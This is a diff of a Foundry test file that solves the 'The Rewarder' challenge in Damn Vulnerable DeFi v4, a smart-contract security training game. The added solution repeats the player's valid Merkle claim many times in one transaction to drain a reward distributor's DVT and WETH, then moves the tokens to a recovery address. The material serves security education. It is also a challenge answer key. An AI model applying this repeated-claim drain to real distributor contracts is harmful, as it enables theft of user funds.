@@ -1,3 +1,4 @@
+
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
@@ -26,6 +27,10 @@ contract TheRewarderChallenge is Test {
     // Alice is the address at index 2 in the distribution files
     uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
     uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;
+
+    // Player is the address at index 188 in the distribution files
+    uint256 constant PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+    uint256 constant PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
 
     TheRewarderDistributor distributor;
 
@@ -65,6 +70,7 @@ contract TheRewarderChallenge is Test {
         bytes32[] memory wethLeaves = _loadRewards(
             "/test/the-rewarder/weth-distribution.json"
         );
+
         merkle = new Merkle();
         dvtRoot = merkle.getRoot(dvtLeaves);
         wethRoot = merkle.getRoot(wethLeaves);
@@ -100,18 +106,18 @@ contract TheRewarderChallenge is Test {
 
         // First, the DVT claim
         claims[0] = Claim({
-            batchNumber: 0, // claim corresponds to first DVT batch
+            batchNumber: 0,
             amount: ALICE_DVT_CLAIM_AMOUNT,
-            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
-            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 2)
         });
 
         // And then, the WETH claim
         claims[1] = Claim({
-            batchNumber: 0, // claim corresponds to first WETH batch
+            batchNumber: 0,
             amount: ALICE_WETH_CLAIM_AMOUNT,
-            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
-            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 2)
         });
 
         // Alice claims once
@@ -127,9 +133,9 @@ contract TheRewarderChallenge is Test {
             inputClaims: claims,
             inputTokens: tokensToClaim
         });
-        vm.stopPrank(); // stop alice prank
+        vm.stopPrank();
 
-        vm.stopPrank(); // stop deployer prank
+        vm.stopPrank();
     }
 
     /**
@@ -150,13 +156,13 @@ contract TheRewarderChallenge is Test {
         assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);
 
         // After Alice's claim, distributor still has enough tokens to distribute
-        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT -
-            ALICE_DVT_CLAIM_AMOUNT;
+        uint256 expectedDVTLeft =
+            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
         assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
         assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);
 
-        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT -
-            ALICE_WETH_CLAIM_AMOUNT;
+        uint256 expectedWETHLeft =
+            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
         assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
@@ -164,7 +170,68 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {}
+    function test_theRewarder() public checkSolvedByPlayer {
+        // Load the Merkle leaves for both distributions
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        // Create the player's valid claims
+        Claim memory dvtClaim = Claim({
+            batchNumber: 0,
+            amount: PLAYER_DVT_CLAIM_AMOUNT,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+        });
+
+        Claim memory wethClaim = Claim({
+            batchNumber: 0,
+            amount: PLAYER_WETH_CLAIM_AMOUNT,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+        });
+
+        // Calculate how many times each claim can be repeated
+        uint256 remainingDVT = distributor.getRemaining(address(dvt));
+        uint256 remainingWETH = distributor.getRemaining(address(weth));
+
+        uint256 dvtClaimsLength =
+            remainingDVT / PLAYER_DVT_CLAIM_AMOUNT;
+
+        uint256 wethClaimsLength =
+            remainingWETH / PLAYER_WETH_CLAIM_AMOUNT;
+
+        // Prepare the token and claim arrays
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](
+            dvtClaimsLength + wethClaimsLength
+        );
+
+        // Repeat the DVT claim first, followed by the WETH claim
+        for (uint256 i = 0; i < claims.length; i++) {
+            if (i < dvtClaimsLength) {
+                claims[i] = dvtClaim;
+            } else {
+                claims[i] = wethClaim;
+            }
+        }
+
+        // Execute all repeated claims in a single transaction
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        // Transfer recovered tokens to the recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -209,15 +276,22 @@ contract TheRewarderChallenge is Test {
         string memory path
     ) private view returns (bytes32[] memory leaves) {
         Reward[] memory rewards = abi.decode(
-            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
+            vm.parseJson(
+                vm.readFile(string.concat(vm.projectRoot(), path))
+            ),
             (Reward[])
         );
+
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
+
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(
-                abi.encodePacked(rewards[i].beneficiary, rewards[i].amount)
+                abi.encodePacked(
+                    rewards[i].beneficiary,
+                    rewards[i].amount
+                )
             );
         }
     }
